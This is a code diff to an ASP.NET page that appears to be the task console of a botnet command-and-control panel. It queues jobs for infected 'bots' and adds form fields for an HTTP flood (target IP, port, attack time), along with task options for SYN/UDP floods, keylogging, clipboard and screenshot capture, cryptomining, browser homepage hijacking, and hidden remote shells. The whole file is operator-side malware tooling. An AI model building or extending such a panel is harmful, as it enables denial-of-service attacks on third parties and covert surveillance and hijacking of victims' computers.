@@ -139,7 +139,6 @@ public partial class Tasks : System.Web.UI.Page
                             cmd.ExecuteNonQuery();
                             cmd.Parameters.Clear();
                         }
-                        lblConnectionsWeekText.Text = CTask.ToString();
                     }
                     RegisterBots();
                 }
@@ -233,10 +232,10 @@ public partial class Tasks : System.Web.UI.Page
                         cmd.Parameters.AddWithValue("TaskID", TaskID);
                         cmd.Parameters.AddWithValue("UserID", "15");
                         cmd.Parameters.AddWithValue("Type", Task);
-                        cmd.Parameters.AddWithValue("Parameter1", "");
-                        cmd.Parameters.AddWithValue("Parameter2", "");
-                        cmd.Parameters.AddWithValue("Parameter3", "");
-                        cmd.Parameters.AddWithValue("Parameter4", "");
+                        cmd.Parameters.AddWithValue("Parameter1", txtPar1.Text);
+                        cmd.Parameters.AddWithValue("Parameter2", txtPar2.Text);
+                        cmd.Parameters.AddWithValue("Parameter3", txtPar3.Text);
+                        cmd.Parameters.AddWithValue("Parameter4", txtPar4.Text);
                         cmd.Parameters.AddWithValue("Max", amount);
                         cmd.Parameters.AddWithValue("Running", amount);
                         cmd.Parameters.AddWithValue("Filter", where);
@@ -249,12 +248,9 @@ public partial class Tasks : System.Web.UI.Page
                 else
                 {
                     lblError.Text = "One or more bots could not be added cause they are already performing this particular task";
-
                 }
-
-                
             }
-            Array.Clear(Bots,0,Bots.Length);
+            Array.Clear(Bots, 0, Bots.Length);
         }
     }
 
@@ -335,6 +331,113 @@ public partial class Tasks : System.Web.UI.Page
                 grdTask.DataBind();
                 reader.Close();
             }
+        }
+    }
+
+    protected void ddTask_SelectedIndexChanged(object sender, EventArgs e)
+    {
+        txtPar1.Visible = false;
+        txtPar2.Visible = false;
+        txtPar3.Visible = false;
+        txtPar4.Visible = false;
+        lblPar1.Visible = false;
+        lblPar2.Visible = false;
+        lblPar3.Visible = false;
+        lblPar4.Visible = false;
+        txtPar1.Text = "";
+        txtPar2.Text = "";
+        txtPar3.Text = "";
+        txtPar4.Text = "";
+
+        if (ddTask.SelectedValue == "clipboard")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "screenshot")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "http")
+        {
+            txtPar1.Visible = true;
+            txtPar1.Attributes.Add("placeholder", "Target IP address or Website");
+            lblPar1.Visible = true;
+            lblPar1.Text = "IP";
+
+            txtPar2.Visible = true;
+            txtPar2.Attributes.Add("placeholder", "Target port");
+            lblPar2.Visible = true;
+            lblPar2.Text = "Port";
+
+            txtPar3.Visible = true;
+            txtPar3.Attributes.Add("placeholder", "Attack Time in Seconds");
+            lblPar3.Visible = true;
+            lblPar3.Text = "Time";
+        }
+        else if (ddTask.SelectedValue == "syn")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "udp")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "download")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "firefox")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "homepage")
+        {
+            txtPar1.Visible = true;
+            txtPar1.Attributes.Add("placeholder", "Direct link to website");
+            lblPar1.Visible = true;
+            lblPar1.Text = "Website";
+        }
+        else if (ddTask.SelectedValue == "keylogger")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "mine")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "cleanse")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "update")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "uninstall")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "viewhidden")
+        {
+            txtPar1.Visible = true;
+            txtPar1.Attributes.Add("placeholder", "Direct link to website");
+            lblPar1.Visible = true;
+            lblPar1.Text = "Website";
+        }
+        else if (ddTask.SelectedValue == "viewvisable")
+        {
+            txtPar1.Visible = true;
+            txtPar1.Attributes.Add("placeholder","Direct link to website");
+            lblPar1.Visible = true;
+            lblPar1.Text = "Website";
+        }
+        else if (ddTask.SelectedValue == "shellhidden")
+        {
+
+        }
+        else if (ddTask.SelectedValue == "shellvisable")
+        {
+
         }
     }
 }
